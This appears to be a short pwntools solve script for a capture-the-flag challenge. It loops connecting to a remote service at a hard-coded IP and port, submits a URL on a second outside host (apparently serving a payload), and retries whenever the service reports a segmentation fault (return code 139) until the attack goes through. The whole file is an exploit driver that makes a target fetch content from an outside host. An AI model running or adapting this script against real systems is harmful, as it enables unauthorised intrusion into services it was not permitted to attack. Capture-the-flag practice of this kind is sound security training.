#!/usr/bin/env python3

from pwn import *

while True:
    r = remote('34.168.202.33', 31337)
    r.sendlineafter(b":", b"http://35.188.47.220:50000/")
    res = r.recvuntil(b"Done")
    if b"Return code: 139" in res:
        r.close()
        continue
    break
